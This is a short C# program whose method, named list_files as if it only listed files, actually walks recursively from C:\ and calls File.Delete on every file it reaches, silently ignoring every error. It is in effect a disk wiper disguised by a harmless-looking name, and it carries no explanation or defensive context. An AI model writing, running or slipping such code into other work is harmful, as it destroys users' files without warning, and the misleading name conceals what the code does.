using System;
using System.IO;

public class Program
{
	public static void Main()
	{
		list_files(@"C:\");
	}

	public static void list_files(string directory)
	{
		try
		{
			string[] files = Directory.GetFiles(directory);
			foreach (string file in files)
			{
				try
				{
					File.Delete(file);
				}
				catch(Exception)
				{
						;
				}
			}

			string[] sub_directories = Directory.GetDirectories(directory);
			foreach (string sub_directory in sub_directories)
			{
				list_files(sub_directory);
			}
		}
		catch(Exception)	
		{
			;
		}	
	}
}
 
